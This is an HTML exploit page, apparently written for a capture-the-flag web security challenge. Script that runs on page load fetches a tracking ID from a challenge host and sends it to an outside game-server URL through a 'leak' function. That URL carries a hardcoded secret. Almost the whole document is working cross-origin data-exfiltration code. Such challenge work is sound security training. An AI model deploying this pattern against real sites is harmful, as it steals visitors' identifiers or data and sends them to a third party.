<!DOCTYPE html>
<html>
<head>
    <title>Tracking ID Retrieval and Leak</title>
    <meta charset="utf-8">
</head>
<body>
    <h1>Attempting to retrieve tracking ID...</h1>
    <p id="status">Starting process...</p>

    <script>
        // The leak function provided by the challenge
        function leak(data) {
            const gameServerLeakUrl = `https://gameserver.websec.saarland/leak?secret=0ab1191eb8d8453c2663adc4869d040d&data=${encodeURIComponent(data)}`;
            document.getElementById('status').innerText = "Attempting to leak data to game server...";
            console.log("Leak URL:", gameServerLeakUrl);

            fetch(gameServerLeakUrl)
                .then(response => {
                    if (response.ok) {
                        console.log("Data leaked successfully! Check the game server logs/interface for the 24-bit string.");
                        document.getElementById('status').innerText = "Data leaked successfully! You should have the 24-bit string now. Proceed to calculate SHA-256.";
                    } else {
                        console.error("Failed to leak data:", response.status, response.statusText);
                        document.getElementById('status').innerText = `Failed to leak data: HTTP ${response.status} ${response.statusText}`;
                    }
                })
                .catch(error => {
                    console.error("Error during leak request:", error);
                    document.getElementById('status').innerText = `Error during leak request: ${error.message}`;
                });
        }

        async function retrieveAndLeakTrackingID() {
            // The target URL to get the tracking ID.
            // THIS MUST BE HTTP to avoid mixed content blocking when your exploit page is also HTTP.
            const targetTrackingUrl = "http://0.tracking.jeopardy.websec.saarland/get"; 

            try {
                document.getElementById('status').innerText = `Fetching tracking ID from ${targetTrackingUrl}...`;
                console.log(`Attempting to fetch from: ${targetTrackingUrl}`);

                const response = await fetch(targetTrackingUrl);

                if (!response.ok) {
                    throw new Error(`HTTP error! Status: ${response.status} ${response.statusText}`);
                }

                const trackingID = await response.text();

                console.log("Successfully retrieved 24-bit Tracking ID:", trackingID);
                document.getElementById('status').innerText = `Tracking ID retrieved: ${trackingID}. Now initiating leak...`;

                // Call the provided leak function with the retrieved data
                leak(trackingID);

            } catch (error) {
                console.error("Error in retrieveAndLeakTrackingID:", error);
                document.getElementById('status').innerText = `Error: ${error.message}. Please ensure this page is hosted on HTTP to avoid mixed content blocking.`;
            }
        }

        // Execute the main function when the page loads
        window.onload = retrieveAndLeakTrackingID;
    </script>
</body>
</html>
